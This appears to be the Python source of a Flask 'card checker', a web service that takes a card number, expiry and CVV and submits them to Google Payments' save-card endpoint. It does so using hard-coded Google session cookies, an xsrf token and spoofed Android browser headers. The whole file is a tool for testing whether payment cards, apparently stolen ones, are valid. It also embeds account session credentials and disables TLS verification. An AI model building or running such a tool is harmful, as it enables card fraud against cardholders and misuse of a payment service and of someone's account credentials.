from flask import Flask, request, jsonify
import requests
import urllib3

# Disable unnecessary SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

@app.route('/check_visa', methods=['GET'])
def check_visa():
    # Get visa data from query parameters
    visa_data = request.args.get('visa')
    
    if not visa_data:
        return jsonify({'error': 'Visa data required in format: card_number|month|year|cvv'}), 400
    
    try:
        # Split visa data into components
        card_number, month, year, cvv = visa_data.split('|')
    except ValueError:
        return jsonify({'error': 'Invalid data format. Required: card_number|month|year|cvv'}), 400
    
    # Updated cookies
    cookies = {
        'OTZ': '8178671_44_48_171240_44_319500',
        '__Secure-ENID': '28.SE=gCYShULI3i76tnAL80tFuKIUUi8xWEDSAbi46FkRdpxYqEBygLQCLLw6gKoVrKHVQTwTm_zF8BxwrcjxUzVAnVbfSEOLc5PnrbI9PFDL3LxkIwgNcVyI7WoH_xvrhXWCHh5LPA6aJJFX0_Iv4QDxVtbmeARl6CX5imbIGtt1CChyDRfqvZH95o3rNGYYt0hpzdlv5bPy',
        'AEC': 'AVh_V2hzxFLibH_qBk5D6d21yORUhMA_VvbBQYlrtyFtszipq9NhRgfS-VI',
        'NID': '525=iL-B3tg_V1sxABv1SmhTHhbJzMtlTgKn5c-bZGTBQJ-nkFMzSzoOqk-M6uzFMWc7FSngHxuTQ7P3oGzU448xYkk-E50TbnseHNyNzuT9nQ7C_X1H01HUsurosxycTJRqKbTMdreM98Fi2TkA0__PkcHgcy7iB7tvzukautwd4ZCkaSNtxPR-EminZRrvmQupJeI3aBnJ6TxzWaGsojNuAuriI7AAc1eyvduroUhJAnq38wANJkpwp4LzKu7P2S_Qmp0hbluYEtLOeUJaJwSk04hXhNNCZjMvsUzg8qSAFQXIDiFEqsbsFi7gXL3woaWqGagzmEmeUuLyAExadp7Yu1TNNanw5HCVuvCtvVg1LckXovEIOayoJcI-UczMut8YL8Wo29rH7_qRhowbPYkaWufFHvmvmd8Smykqm7q2R5dSj8QFoz0tRBHSMG2gZ9u7bENoskZFBdCfcueMGlR0PIJsReA7VtTfqdFULDf2ZqtSzgAwk45ktemqqj9KL2jhhl9eSF7FhRY03NNEQfCbyTWJVIFDIeOvBbaNFXzi7sBB7qPWWgYdkjhn2RtESkse8f2U1TlkykJJNzBdiwt7bsqk9vc7J0zF31nwklwq6lSDLkBj-xFMsqcu327RgMu2hvhgfbe2bPu-8Oc3VdKPsj3POwt8cKRRYdpoVdIvnK2MfS9EMOQ7jTAA0AdAydKBNdidfRXWVeXSYwESaFHWECjKY5yCxrI8rzeOfBZ5rubrnRJOuy-Gc6hASTJZ3VXMd1PLnJ-mfqbEyUPHy1J4gN4uuI2_dznbBQSI5d0xzzUropBFDoWWmjjUwL4dJHKGZR61BY_geH_hv-vcSPBwFkeBjMaa1JCQM9ND3td-Vw3rUpOO90o_7Av63TOQ7tyWbfLEWQQDmpnTZXDval9PuCv5upTGH181K-AHC49O4A4nxLZXNco4dqkBNts2dQzWGq1f5W1iHEkbbnzvO24NheBj4RsgNMupJRuIu7u7WoA1dLTGQu8ZGxJpRUjInHKBmm47RPK_JISO_wQdLt8lKNYBUHY9g28QGk8XXyKcetrIDdzbgbxsUT86hTTv8iubD4bWPbt2c5PrUz01MjGBgOGf8V-xL8xJWMzPQRCOEnOnL899O-UL6pzHfzC6_XXas1iPG7tMUsI',
        'SID': 'g.a000zwiGj9eWzbxOJdZDdMZpbPRzJK0stxIaYKVf_Gf-sJKMkGYLmhiX6GJwgRHqYMBJXort9AACgYKAfsSARYSFQHGX2MiIX10JnWNd9BE0vXErwv3_BoVAUF8yKrfqe_KP628-aKysD0ED3nn0076',
        '__Secure-1PSID': 'g.a000zwiGj9eWzbxOJdZDdMZpbPRzJK0stxIaYKVf_Gf-sJKMkGYLQmvP3rIu0knKQYBK0lpdoAACgYKATASARYSFQHGX2MizvGrTNJ19P3acRf9hnGphRoVAUF8yKrcNTvInU5fSfGmnHcsG6HX0076',
        '__Secure-3PSID': 'g.a000zwiGj9eWzbxOJdZDdMZpbPRzJK0stxIaYKVf_Gf-sJKMkGYLMbbPBaPuaoJbOkzyhDeSlQACgYKAX8SARYSFQHGX2MijMr_lEOEFlCf7Ar7_b1UTxoVAUF8yKr18GVqeTHOBvDoXyn_M8Vq0076',
        'HSID': 'AOuI9xiT_jt8dqQcK',
        'SSID': 'A1581KN-P65vxWbiF',
        'APISID': 'IDj0_vIJrGjIheIp/ASYWqZ61tGjl80OBb',
        'SAPISID': 'mx2QhURX2n-cNtOn/AHwmVG1r5aR4iUDN_',
        '__Secure-1PAPISID': 'mx2QhURX2n-cNtOn/AHwmVG1r5aR4iUDN_',
        '__Secure-3PAPISID': 'mx2QhURX2n-cNtOn/AHwmVG1r5aR4iUDN_',
        '__utma': '207539602.2100594883.1742201890.1753806231.1753869729.15',
        '__utmc': '207539602',
        '__utmz': '207539602.1753869729.15.15.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        '__utmt': '1',
        'S': 'billing-ui-v3=yUZqcfxdn8qIhEOTkvzaGvEBoARPGe_h:billing-ui-v3-efe=yUZqcfxdn8qIhEOTkvzaGvEBoARPGe_h',
        '__utmb': '207539602.9.9.1753869788040',
        'SIDCC': 'AKEyXzVTeP7UPY1Dw59PicwSccXaos2sFTmuqW0Klc2pI5OoBRd8IdUuxud0aomuPq5a-eFCiw',
        '__Secure-1PSIDCC': 'AKEyXzVvDbp53GR57kH151nw91Zp1_ZG39eXH-HZIhowMLK3GLGZWP3mO9DNuzybNPwzzE3dW7s',
        '__Secure-3PSIDCC': 'AKEyXzU6jnj48I-cRjCvMwkgHkyvzyrPBRKvm_T3HsaCuW8nSLJvFGFKUTpYHeKOtdabChZza4U',
    }

    # Updated headers
    headers = {
        'authority': 'payments.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://payments.google.com',
        'referer': 'https://payments.google.com/payments/u/0/embedded/instrument_manager',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"137.0.7337.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"SM-A307FN"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-client-data': 'CIOJywE=',
        'x-requested-with': 'XmlHttpRequest',
    }

    # Updated params
    params = {
        'ait': 'GAIA',
        'cn': '$p_do3gez33qr530',
        'eo': 'https://wallet.google.com',
        'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
        'ipi': 'gidjv1zbc7oc',
        'hl': 'en',
        'mm': 'e',
        'origin': 'https://wallet.google.com',
        'si': '2272650121602843',
        'style': ':m2',
        'cst': '1753869726224',
        'wst': '1753869715920',
        's7e': '3.1.0.0;3.1.0.1',
        'rt': 'j',
        's': '8',
    }

    # Updated data
    data = {
        'xsrf': 'AJWlU2N7SO4jmvVJzZ1-aJkKA2e-OyitoA:1753869728673',
        '3.1.0.0': card_number,
        '3.1.0.1': cvv,
        'msg': '[[null,"ACo329yppgLMMjk96ht9BL4l1YLEItdap3L7pSFxKzUsnBH/03GAGX+qXlZg3ssjONVQJOgsaxXL9AGRwLm133W2e+5wdwwlUzbyXbhgSRrWRvfJqk6/gikxGe9hcKjOedlZKoUYK7oFC6YOfCevBKcVC/dLcGHLoHHS30O5QicCNyx/mR0zD09kc008zAiHRrxQTA0+3FlHCYKNuHAZxn+Ziq/XOC7VF26VhvEQJL1HWIbDv4fJA7esFyCnli0eN/nNSdXHK2EI",null,[null,[null,null,null,["!b2ylbDTNAAZAdzQfYHdCUVZq9EkCO447ADQBEArZ1ITsVo9Sje1v_M75GTMxdRoCJHJOkgzjUZ7-AclycA_J8NA1bXi0PJcF5S_Zd9VUAgAAC45SAAAANGgBB34ATJ9njwdInxT8QDOQk-kwVIXtW-g7QqJcKJ3lb9pS4x3On8BaoToiNHFOvhceWLd1fe7GhQ3iQFz8UiA3uF8Q4hikbGj_xcffrV6qk0GZCkxcPf2XJWkmsfdX3H5mYXAdv1nF1W7p303Dmh9PcO8jR3bTQs_7HiGXZvYtj4nooNCiCJE6TFRrFNI6_vHTr8nE-a1qXz9NamgVfqoKNG15bQmSXrcFFrCOW5JHzGts8FeGu6jRbXQ3Ik2XJ8UbtcgWnmt_pjSJA5AxXRhssMo-4POnMUsnkqZqJFkZ8MLVaVtQVfSugx7pYJIXIjw6hLLIxhkVKCuBq-JzZgGqyeo6LIr_Ci46p8De5ZeZO8l8GeChsYUAI_uWrcfLyGPJ9i3bcOcODn4-n9n85Bt5QX0BFkaE5LDF2VSXw68BkxROaOG6tvCkyBoprvpmW4XH0FO91MEwxGzAefyFj9jlKUIYdW99nuwQC4sRT2_5G0pilKchODr8kxiVhPcXNVzCsC14bBHe4waGKLln9xZ9PhQcV-qg3-2q23UfzTQRTWzki9H1wlpnVbvpctRN8PNHqCC1Gqd31b2gSE63zhkCYCfhK1sKt1Exb6j7qNRJbakZcDBI8rI1hIOPGbwWWAaXHEe03-adBzpnuYqIAu63Z5EllnmaX-4DuYhQI3kKJ07etai7xdlfCnMXtXYoxiJ0ofSowMy6RWMRzx1BJrfUSjPmvhzaVITjVmo2oeQ5L-kHyKsuwofwZqx4O_S6LOAaxmhFHRYg8w-U2hv1HPJsrewsFE3JTXcawAPJyeCSVL7HHvPgUydYFhk-vKVMKwPikLP3s1zaoAWN500vQrhOVBi3OgACpDupisprxn_LGssU126c8MSC6JLWPZ39bl_-GoXhrGsf4wyH_JoN0TDb6a3tBsY9KJYniLVi4KhCsCMrEj17d-iX-xVLJfSofdXAgxDoJsxU5DD9s59PjnUja1uyOGLC2GjhqpmSou1XI47-4R4gj9wihMsMmeIE9pZ8o8q89tkITYGV7NmlmVDbJH46VECX9TwtbJjv1aWhDVpm355ZFx0rstaZnF8JCVfVS5unYbWjlaD8gCmBLDRVMp3zr0l5RlHIJQlGMWnXBkITPDCl19yd67I2EBwprItwqcEwBbChMDVZoqjsH8HVW5vpygUWaJg3P-Q-raKKAIdWwUsmIQkTieyziBMt1--MybgiyzgIfwBVAr8tnbHJRibBb5W9VL_JWBMTDdI3qVyscHy4568bl1w-fW4SPdYXkBgVBNgsLxL1kumU2SNQaG--Nd8IXP-zoiwus_VBVLSqGwu9Zah04G-DaBLU814In-0SBchWuHHnjChPQp-QqCNSAAU40AoyayEvkt2qo4zoEdd2Ym0NFnccmShLFWbDXRnSUi-T3F4qITj8KwlMMGyZucbz7JWEiixkJSHJiZS8kpQfsyuWzR_UKGvQSUAbWsR0Sty2igNRpo8TiCXHJ3FewG7tODsXdKaWCMHh2vzopzTZbx-8wG8-A1eu8VdKBCqer0HzRNGMJmShhnvMxcD6Yy89Gz1cmKIWBPZgM9AZwATRjY4idwrgPhR8a2twZxQWVmCmDy05CndmpSoXMqXI7fiBEo-gKt_Pz5UP4vwxx42MFH_Tf0QlA8bqxpGmMsRvvfeRvGB7d8Qb7DYskk1Qtm95tdfLRuBYe46d4iN2mBQmly4SVjzr8VuGKW2bGLb5Zg9onZ-_h35gVFKWtDsgm7noCZJa92Tideo1v63LVt4G4v42LHBKR3UCOHqjJgSuO_t7UHERpioN_nDL1VEJN8w0yXneH8v5lSwEU5WPwcpWoQT5FiCHm0dZsIyCSQc5P4_iXBomFKIQA8o1L_kdY0SGXYVV22Z5pJrtP-xuKsxZQz3Tjds6JvwZDR7mYI9Ca-QP0oLEMfYqA10-s7r7KscviP9cpO_F90V2qJRrSM0gCTRWsnZcknmmc6P7sRZiaOHiwd1Vm9LsNuKM_XqtnaHWCJZI3rtE79cvImSJcRp0_XwslLtQDbiXmCB8QrxnuUJJU3UoqXWdMxise-z2q7liiLxKZlTaoAyled7fk-_oJoxzds7YhzdSL7r9JqgVcQDDf_wOuUySTp4AyBR3AbTKDrk5-UsfD_gLidawZOpwIEfsXtZSS4E9CG9WEhk-_MBuxJ23pyfPoU_ZDYRPgzqU3oiWDYr_Ai3eXScw2oRTMFI7chxZsUvGiAbAqx0tW3kjf2reokZPr22tyEH10PTc1w7jKSBTn1quFNNV_65uMwy9DS3LkpMEidDCZ8UsgW-pgBePeVD5Ydx8_9MCVKAmF9f5rm3ItF-wX1tSivU3fFtbyoe4YISc334S5Zho5zXykfVJ9Erpi4ZXaxjl3hXo4IyyJi5qOV8kZTpsJbCvVOAskW0FqBZflNL6CfZX_y2sjTmapCKLmbTPnBFQ5AyIOzRnf3xsJapVIBQl9Dn_X55q17cxXv4rm6uLKvuGhWpEdQGJzEU1E020kEc3RfPIq4OclNFybG-oMbwV9dwoGIdFu_A4KjVtvfSdOC2tKnYIHNdsVxDq2KH6vIpRVXEtEyd0BYOl171bDQEWdFqigL17VQKfMwgc0nbN5nJBbuTrfEGXPnhe-_aGJh4b8k-b0abCIhh6qneB3jfwVauU0NaqBHTgetRFLZP0-BF-UTij-vMAs5TtFly9Q7_nMbuFJ3j8PslK6bOmigWipxwzApo38pctHaKRdTrFq_Md72CJ-xz1mZuonzvRBRxk1meIs3wDBOZhnHbmlDBDqY1wToLikkv_zrEGkAem2ZVWgbE4fxGGWfWWK7YSiS7eE8t9w0clkuqLYGI49K7jyckjocNjznb-l3tcif7LTI-ozBJUCEJaGHnfWXRQ1U3AcULlnF3M1iZwJUlKcgx9EKwt8IPZxs1YrfAkhwkf9O51sLVbRWjs3kYTmj0iCAIFG1oK10NZaFdNE_CUhuHFxNYzAiWrw50y21U1HRm8Ycbwyq8jjC6Fpkwct5xsfZ-P_aWupXGSgAgO8ZuBJ3qpikS28gGdwreYcRBz8OBA3CadVqaHFRgjbm35XVe49xAPV4kQtkvtQ_T6HAK6NHP1dz50NZsQNyVf1yasUmeoTn6g9Dh3lnQvxwCnhG-6XfRrD-QI34um_0ANTygc2cLu9rNvnW51jXdwefqqUKOWCTPVAEstWOq5gsbE-oYzPT1yj4OQdIjah5n2JHZHQutKvK6M98MDXu059E-EwxSPcaRg9RE-n015o2QK0aobHKYtlH4W5RPVOrwTalLodPXo27dTHAd0MQ3T9zIFoOwl6L5Ozf_y3_7i2SkD0puu4vteR5DpzOW_ExvcUvjKpjB18_wxG1Zr2EVJOQFwSiwwsnGk4oNDHQKiNrS8QP4oaJbiCWdhKY9D3QPZvCJdVevIsmnN9rewTETqOELZn1U7dP_aKtzG8jFxcjH36OeOzrjCZDoIBzIi1QJm1jzn-kmOV5EPMx0T4p-sngX3ykV6b61sctPVgVVE9I27FdrTG2yMVL0YGT871tvnmlFxymO0zTyF-vL_C5vzaas3vNvjodefQsGCwc2z__HDBiqVJxO0G38PZtFyIEa2LUMKbQ"]]],null,null,"en",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",11,2029,null,"4370",null,"__s7e_data__61bb463a","John Doe",[["US",null,"NY",null,"New York",null,null,null,null,null,null,"10001",null,["123 Main St","Apt 4B"]],null,null,null,"billingAddress",null,null,2001],"CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/en","creditCardForm-1"]]]]',
        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,2,140,a063ebe9,0,2b6,edd98bac,0,18,4863fd35,1,140,cb2d5c6f,0,2b6,6ad47c6c,2,e8,7bdb49f6,0,95,b6540200,1,140,eea820b6,0,26e,1aa4331,0,"Linux armv81,f54683f2,0,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,1,"en,5cc3ab5f,0,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,0,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,0,7:a21,3,1985ac83af0,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2b6:a40,"f,1985ac83da7,"n,0,0,"t,1985ac83277,0,0,0,0,1985ac83281,1985ac83281,1985ac83281,1985ac83281,1985ac83281,0,1985ac83291,1985ac8368a,1985ac836a5,1985ac836b4,1985ac83b1f,1985ac83b1f,1985ac83e9f,1985ac83f99,1985ac83f99,1985ac83fd9:a10:a31,3,"h,1,"p,8f,d1,"m,1f5,631,1186,1568,145d,2eb6,e4,36e,2cd4,24f5,f2d,5684,2720'
    }

    try:
        # Create session with better connection settings
        session = requests.Session()
        session.verify = False  # Disable SSL verification (for testing only)
        session.headers.update(headers)
        
        # Send request with advanced settings
        response = session.post(
            'https://payments.google.com/efe/payments/u/0/instrument_manager_save_page',
            params=params,
            cookies=cookies,
            data=data,
            timeout=15,
            allow_redirects=True
        )
        
        # Return response as JSON
        return jsonify({
            'status_code': response.status_code,
            'content': response.text
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            'error': str(e),
            'message': 'Failed to connect to Google server. Check internet connection or update cookies/headers.'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
